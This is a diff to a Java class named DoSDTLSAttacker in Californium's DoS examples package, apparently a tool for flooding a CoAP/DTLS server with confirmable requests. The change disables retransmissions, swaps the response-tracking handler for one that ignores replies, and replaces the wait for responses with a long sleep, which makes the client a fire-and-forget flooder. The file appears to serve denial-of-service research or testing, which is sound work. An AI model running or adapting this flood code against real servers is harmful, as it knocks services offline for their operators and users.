@@ -2,8 +2,7 @@ package org.eclipse.californium.examples.dos;
 
 import java.io.IOException;
 import java.security.GeneralSecurityException;
-import java.util.concurrent.ConcurrentLinkedQueue;
-import java.util.concurrent.CountDownLatch;
+import java.util.concurrent.TimeUnit;
 
 import org.eclipse.californium.core.CoapClient;
 import org.eclipse.californium.core.CoapHandler;
@@ -38,24 +37,17 @@ public class DoSDTLSAttacker {
     final ReliabilityLayerParameters reliabilityParams = ReliabilityLayerParameters
 			.builder()
 			.applyConfig(config)
+			.maxRetransmit(0) // Disable retransmissions.
 			.build();
 		final CoapClient dtlsAttacker = DoSUtil.makeCoapClient(false, config);
 		dtlsAttacker.useCONs();
 
-    // Configure an asynchronous handler and countdown latch
-    final ConcurrentLinkedQueue<CoapResponse> responseQueue = new ConcurrentLinkedQueue<>();
-    final CountDownLatch latch = new CountDownLatch(num_messages);
+    // Configure an asynchronous handler that does nothing.
     final CoapHandler handler = new CoapHandler() {
       @Override
-      public void onLoad(CoapResponse response) {
-        responseQueue.add(response);
-        latch.countDown();
-      }
-
+      public void onLoad(CoapResponse response) { /* Do nothing. */ }
       @Override
-      public void onError() {
-        latch.countDown();
-      }
+      public void onError() { /* Do nothing. */ }
     };
 
     RandomTokenGenerator tokenGenerator = new RandomTokenGenerator(config);
@@ -83,7 +75,7 @@ public class DoSDTLSAttacker {
 			dtlsAttacker.advanced(handler, request);
 		}
 
-    // Wait for all requests to come back
-    latch.await();
+		// Sleep.
+		TimeUnit.SECONDS.sleep(1000);
   }
 }
